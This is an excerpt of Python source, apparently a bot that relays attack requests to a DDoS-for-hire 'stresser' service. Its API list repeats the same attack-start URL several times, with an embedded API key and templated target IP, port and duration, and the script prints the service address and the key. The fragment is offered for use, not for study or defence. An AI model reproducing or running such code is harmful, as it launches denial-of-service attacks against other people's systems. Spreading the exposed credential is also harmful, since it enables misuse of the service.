...
# ===== API LIST - 10 SLOTS (UPDATED WITH WORKING API) =====
API_LIST = [
    "http://god.godstress.site/api/v1/attack/start?key=nk_6b9c377949946278053350af846d8baa&ip={ip}&port={port}&time={duration}",
    "http://god.godstress.site/api/v1/attack/start?key=nk_6b9c377949946278053350af846d8baa&ip={ip}&port={port}&time={duration}",
    "http://god.godstress.site/api/v1/attack/start?key=nk_6b9c377949946278053350af846d8baa&ip={ip}&port={port}&time={duration}",
    "http://god.godstress.site/api/v1/attack/start?key=nk_6b9c377949946278053350af846d8baa&ip={ip}&port={port}&time={duration}",
    "http://god.godstress.site/api/v1/attack/start?key=nk_6b9c377949946278053350af846d8baa&ip={ip}&port={port}&time={duration}",
        ...
        try:
            if get_reel_enabled():
                ...
                if reel_id:
                    ...
                    # If video sent successfully, we don't need to send separate text, but we can also send text if caption too long? But we used caption.
                    # In case caption is not supported well, we can also send text after video.
                    # But we already have caption, so skip separate text.
                    # However, if owner wants both, we can send text after video.
                    # I'll keep it simple: video with caption.
                else:
...
print(f"🌐 API: http://god.godstress.site")
print(f"🔑 API Key: nk_6b9c377949946278053350af846d8baa")
